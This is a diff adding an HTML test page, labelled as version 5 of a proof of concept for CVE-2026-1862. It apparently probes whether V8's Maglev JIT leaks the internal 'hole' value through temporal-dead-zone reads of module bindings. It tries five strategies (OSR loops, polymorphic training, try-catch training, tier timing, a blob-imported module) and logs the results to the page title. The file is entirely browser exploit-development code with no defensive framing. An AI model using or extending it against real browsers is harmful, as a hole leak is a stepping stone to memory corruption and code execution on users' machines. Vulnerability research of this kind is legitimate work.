@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>loading...</title></head>
+<body>
+<pre id="out">init</pre>
+<script type="module">
+// CVE-2026-1862 v5 — export declarations at top level only
+const log = (msg) => {
+  document.getElementById('out').textContent += '\n' + msg;
+  document.title = msg;
+};
+
+log("module loaded");
+
+// ============================================
+// Strategy 1: OSR leak
+// Function references moduleX (declared below at top level)
+// Called BEFORE the declaration executes → x is in TDZ
+// ============================================
+function leakOSR() {
+  for (let i = 0; i < 300000; i++) {
+    if (i === 299999) {
+      return moduleX; // TDZ access after Maglev OSR
+    }
+  }
+  return "no_reach";
+}
+
+let s1result;
+try {
+  s1result = leakOSR();
+} catch(e) {
+  s1result = "THREW:" + e.message;
+}
+
+// Declare AFTER calling leakOSR — this is the TDZ window
+export let moduleX = 42;
+
+let s1hole = typeof s1result === "undefined" && s1result !== undefined;
+log("S1_OSR:" + JSON.stringify({r:String(s1result), t:typeof s1result, u:s1result===undefined, h:s1hole}));
+
+// ============================================
+// Strategy 2: Polymorphic training
+// Train function with safe path, then trigger TDZ path
+// ============================================
+let safeVal = 42;
+
+function readPoly(useModule) {
+  if (useModule) {
+    return moduleY; // TDZ if moduleY not yet initialized
+  }
+  return safeVal;
+}
+
+// Warm up with safe path
+for (let i = 0; i < 200000; i++) readPoly(false);
+
+let s2result;
+try {
+  s2result = readPoly(true);
+} catch(e) {
+  s2result = "THREW:" + e.message;
+}
+
+export let moduleY = 99;
+
+let s2hole = typeof s2result === "undefined" && s2result !== undefined;
+log("S2_POLY:" + JSON.stringify({r:String(s2result), t:typeof s2result, u:s2result===undefined, h:s2hole}));
+
+// ============================================
+// Strategy 3: Try-catch training + post-init leak
+// Train with TDZ throws, init var, then check if Maglev skips hole
+// ============================================
+function readW() { return moduleW; }
+
+let wThrew = 0, wOk = 0;
+for (let i = 0; i < 200000; i++) {
+  try {
+    readW();
+    wOk++;
+  } catch(e) {
+    wThrew++;
+  }
+}
+
+export let moduleW = 200;
+
+// Now call again — moduleW is initialized, but does Maglev have the hole check?
+let s3after;
+try {
+  s3after = readW();
+} catch(e) {
+  s3after = "THREW:" + e.message;
+}
+
+log("S3_TRY:" + JSON.stringify({threw:wThrew, ok:wOk, after:s3after}));
+
+// ============================================
+// Strategy 4: Maglev detection — timing difference
+// ============================================
+function hotLoop() {
+  let s = 0;
+  for (let i = 0; i < 1000000; i++) s += i;
+  return s;
+}
+let t0 = performance.now();
+hotLoop();
+let t1 = performance.now();
+hotLoop();
+let t2 = performance.now();
+log("S4_TIER:first=" + (t1-t0).toFixed(1) + "ms,second=" + (t2-t1).toFixed(1) + "ms,ratio=" + ((t1-t0)/(t2-t1)).toFixed(1) + "x");
+
+// ============================================
+// Strategy 5: Dynamic import with TDZ module
+// ============================================
+const modCode = [
+  'function leak(){for(let i=0;i<300000;i++){if(i===299999)return x;}return"nr";}',
+  'let r;try{r=leak();}catch(e){r="T:"+e.message;}',
+  'export let x=42;',
+  'export let result=r;',
+  'export let isHole=(typeof r==="undefined"&&r!==undefined);',
+  'export let rtype=typeof r;',
+].join('\n');
+
+try {
+  const blob = new Blob([modCode], {type:'application/javascript'});
+  const url = URL.createObjectURL(blob);
+  import(url).then(m => {
+    log("S5_DYN:" + JSON.stringify({r:String(m.result),t:m.rtype,h:m.isHole,x:m.x}));
+  }).catch(e => {
+    log("S5_ERR:" + e.message);
+  });
+} catch(e) {
+  log("S5_INIT_ERR:" + e.message);
+}
+
+log("=== sync done ===");
+</script>
+</body>
+</html>
